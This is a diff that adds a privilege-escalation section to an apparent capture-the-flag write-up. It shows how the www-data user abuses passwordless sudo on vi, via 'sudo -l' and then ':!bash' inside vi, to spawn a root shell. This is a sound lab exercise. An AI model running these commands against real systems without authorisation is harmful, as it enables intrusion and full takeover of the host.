@@ -145,7 +145,24 @@ stty rows 55 columns 285
 
 
 ## Privilege Escalation
-+ xxx
++ Escalate privileges to get the root flag.
++ View commands the user can run using sudo without a password: `sudo -l`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5a18351b-25b3-4a5e-b513-2cc9f403ab54)
+  
++ User www-data can run sudo with no password and with root's privileges for **/usr/bin/vi**.
++ Check gtfobins for [vi](https://gtfobins.github.io/gtfobins/vi/).
++ Run the commands to get the root shell:
+```
+sudo /usr/bin/vi /var/www/html/test
+
+# on vi editor:
+:!bash
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e815cb80-6768-44e3-b989-e788070d7042)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9f9f5417-4313-4712-9274-ac6d79c0fddc)
 
 
 # Technical Knowledge
